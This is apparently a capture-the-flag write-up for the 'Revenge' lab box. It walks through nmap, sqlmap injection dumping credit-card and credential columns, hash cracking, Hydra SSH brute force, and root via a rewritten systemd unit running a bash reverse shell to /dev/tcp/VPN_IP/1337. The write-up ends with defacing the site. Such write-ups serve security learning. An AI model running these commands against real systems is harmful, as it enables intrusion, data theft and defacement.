---
layout: default
title : muzec - Revenge Writeup
---

![Image](https://imgur.com/VLyIDBh.png)

You've been hired by Billy Joel to get revenge on Ducky Inc...the company that fired him. Can you break into the server and complete your mission?

![Image](https://imgur.com/Zhq0XY9.png)

This is revenge! You've been hired by Billy Joel to break into and deface the Rubber Ducky Inc. webpage. He was fired for probably good reasons but who cares, you're just here for the money. Can you fulfill your end of the bargain?

There is a sister room to this one. If you have not completed Blog yet, I recommend you do so. It's not required but may enhance the story for you. 


Billy Joel has sent you a message regarding your mission.  Download it, read it and continue on.

![Image](https://imgur.com/ogWvXUP.png)

```
To whom it may concern,

I know it was you who hacked my blog.  I was really impressed with your skills.  You were a little sloppy 
and left a bit of a footprint so I was able to track you down.  But, thank you for taking me up on my offer.  
I've done some initial enumeration of the site because I know *some* things about hacking but not enough.  
For that reason, I'll let you do your own enumeration and checking.

What I want you to do is simple.  Break into the server that's running the website and deface the front page.  
I don't care how you do it, just do it.  But remember...DO NOT BRING DOWN THE SITE!  We don't want to cause irreparable damage.

When you finish the job, you'll get the rest of your payment.  We agreed upon $5,000.  
Half up-front and half when you finish.

Good luck,

Billy
```

# FLAG 1

Let start with our Nmap scan..

Nmap -sC -sV -oA nmap IP

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-24 07:52 EDT
Nmap scan report for 10.10.31.97
Host is up (0.15s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:53:b7:7a:eb:ab:22:70:1c:f7:3c:7a:c7:76:d9:89 (RSA)
|   256 43:77:00:fb:da:42:02:58:52:12:7d:cd:4e:52:4f:c3 (ECDSA)
|_  256 2b:57:13:7c:c8:4f:1d:c2:68:67:28:3f:8e:39:30:ab (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Home | Rubber Ducky Inc.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.02 seconds
```
Just 2 open Ports 22 SSH and 80 HTTP let move to enumerate port 80.

![Image](https://imgur.com/5yzSyIp.png)

A Rubber Ducky Inc Company cool right?? let look around i try to burst some dirs but all what i get back is what we have in the homepage so a login page let try a random details.

admin admin

admin password

![Image](https://imgur.com/9BH4pQB.png)

But no luck so i go back to the homepage to enumerate more harder.

![Image](https://imgur.com/eKoCbG1.png)

Hmmm Browse On Our Products so let check it out maybe we can find something interesting in the page so i click on product 1.

![Image](https://imgur.com/Bq4rSJT.png)

The first thing that come to my mind is to run sqlmap on the link maybe it vulnerable.

```sqlmap -u "http://example.com/products/1" --dbs --columns```

do you want to try URI injections in the target URL itself? [Y/n/q] y

are you sure that you want to continue with further target testing? [Y/n] y

are you sure that you want to continue with further target testing? [Y/n] y

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Enter

![Image](https://imgur.com/CivchVq.png)

Yes it vulnerable actually i just guesss lol..... 

![Image](https://imgur.com/qbGyVFy.png)

Cool we have the database let dump some details hehehehehehheehehe.....ok am going for the credit_card column first.

```sqlmap -u "http://example.com/prdoucts/1" --dump -C credit_card -T user -D duckyinc```

![Image](https://imgur.com/oX0UPre.png)

Boom dump and we have the first flag....

# FLAG 2

Ok we still have some colmuns to dump like User and Password let go ahead and do that i don't need to explain how to do that again it already explain in the Flag 1 section.

![Image](https://imgur.com/8mDqEAA.png)

Ok let dump the system_user table also.

![Image](https://imgur.com/DOld18Z.png)

Cool let do the same thing for both the passords columns..

![Image](https://imgur.com/MFWMJcd.png)

Boom we have the hash let dump the user table also.

![Image](https://imgur.com/RUaAeZQ.png)

Now to make it easy let create a file name it username for all the username we got in the database and also a seperate file name with hash.

![Image](https://imgur.com/DStDOmA.png)

Now let try to crack the hash file we just save with John The Ripper.

```sudo john --wordlist=rockyou.txt hash```

![Image](https://imgur.com/H8ZZgts.png)

So among all the hashes i was able to crack only one with John The Ripper ok i love running Hydra with the password i found on any boxes so we have only a password and bunch of username let brute force SSh with it.

```hydra -L username file -p password we have ssh://IP```

```
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-24 09:20:27
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:4/p:1), ~1 try per task
[DATA] attacking ssh://10.10.31.97:22/
[22][ssh] host: 10.10.31.97   login: REDACTED   password: REDACTED
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-24 09:20:32
```
Boom we have ssh details let log in now.

![Image](https://imgur.com/1IDeEUp.png)

Boom Boom we have flag2 let move on.

# FLAG 3

Let check Sudo -l

![Image](https://imgur.com/mQSF5nz.png)

```sudoedit /etc/systemd/system/duckyinc.service```

![Image](https://imgur.com/I3TvWhA.png)

We can easy get a reverse shell with the code below clear all the code you found in /etc/systemd/system/duckyinc.service and put the code below. 


```
[Unit]
Description=rooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/VPN_IP/1337 0>&1'

[Install]
WantedBy=multi-user.target
```

Now start a ncat listener on port 1337 if you edit reverse shell code port put the port you edited.

![Image](https://imgur.com/RGv5DQ4.png)

Now type dis;

```sudo /bin/systemctl daemon-reload```
```sudo /bin/systemctl restart duckyinc.service```

Now let go back to our ncat listener we can see we have root shell already.

![Image](https://imgur.com/AMtouFL.png)

Yes root shell now let get the flag3 but when i get in the root directory the root flag is missing.

![image](https://imgur.com/rgUDOuc.png)

So i remember the mission we need to deface the website first so i navigate to /var/www/duckyinc/templates to deface the website.

![Image](https://imgur.com/hxqBgLV.png)

So let go back to the root directory to get the flag3.

![Image](https://imgur.com/HNedWZr.png)

Cool we have the last flag lol...................Box rooted and Thank You For Taking Your Time To Read My Write-up Peace And See You Next Time....

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
